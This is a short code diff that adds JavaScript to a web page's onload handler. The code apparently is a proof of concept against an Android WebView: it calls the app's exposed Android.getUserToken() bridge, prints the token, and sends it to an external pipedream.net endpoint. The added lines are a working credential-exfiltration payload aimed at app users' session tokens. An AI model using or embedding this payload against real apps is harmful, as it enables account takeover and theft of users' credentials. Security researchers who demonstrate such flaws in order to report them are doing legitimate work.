@@ -12,6 +12,14 @@
 
   <script type="text/javascript">
     window.onload = function() {
+      var token = Android.getUserToken();
+
+      document.write("token: " + token);
+
+      var xhttp = new XMLHttpRequest();
+      xhttp.open("GET", "https://eoow6y96ffo9mzx.m.pipedream.net/?token=" + encodeURIComponent(token), true);
+      xhttp.send();
+    
       alert("rhyru9");
     };
   </script>
